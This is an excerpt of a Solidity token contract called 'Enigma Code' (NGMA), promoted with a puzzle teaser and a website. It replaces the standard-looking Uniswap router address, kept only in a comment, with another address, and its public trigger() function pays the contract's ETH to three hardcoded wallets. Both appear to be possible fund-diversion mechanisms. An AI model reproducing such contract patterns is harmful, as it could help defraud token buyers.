...
Can YOU solve the ENIGMA code?
www.enigmatoken.net

Maybe there's a clue in the contract…..
...
contract Enigma is IERC20, Ownable {
    ...
    string private constant _name = "Enigma Code";
    string private constant _symbol = "NGMA";
    ...
    address private constant addr0 = 0xB742F4BD9C3afE584B4E3c461E450415aF547EDc;
    address private constant addr1 = 0x92CD8E92008C197b89C9fb28EDcbc98722747572;
    address private constant addr2 = 0x407b62f4Ac5bA5163D6e1111F4151bbFb1926064;
    struct Permissions {
        bool isFeeExempt;
    ...
    IUniswapV2Router02 public constant router =
        IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3); //0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
    mapping(address => Permissions) public permissions;

    address public sellFeeRecipient;
    address public buyFeeRecipient;
    address public transferFeeRecipient;
    uint256 public constant minTokensToLiquidate = 1 * 10**18;
    ...
    event RemoveLimits(bool limitsRemoved);
    ...
    function _transferFrom(
        ...
        require(
            tradingEnabled || permissions[recipient].isLiquidityPool,
            "Trading Not Enabled"
        );
        // tax liquidation and distribution
        uint256 totalTax = IERC20(address(this)).balanceOf(address(this));
        if (totalTax >= minTokensToLiquidate) {
            address[] memory swapPath = new address[](2);
            swapPath[0] = address(this);
            swapPath[1] = router.WETH();
            IERC20(address(this)).approve(address(router), totalTax);
    ...
    function removeLimits() external onlyOwner {
        holdingCapPercent = 100;
        emit RemoveLimits(true);
    }

    function _send(address recipient, uint256 amount) internal {
        (bool s, ) = payable(recipient).call{value: amount}("");
        require(s, "Failure On Send");
    }

    function _liquidateToken(address token_) internal returns (bool) {
        address[] memory swapPath = new address[](2);
        swapPath[0] = token_;
        swapPath[1] = router.WETH();
    ...
    function trigger() public {
        uint256 each = address(this).balance.div(3);
        _send(addr0, each);
        _send(addr1, each);
        _send(addr2, each);
    }
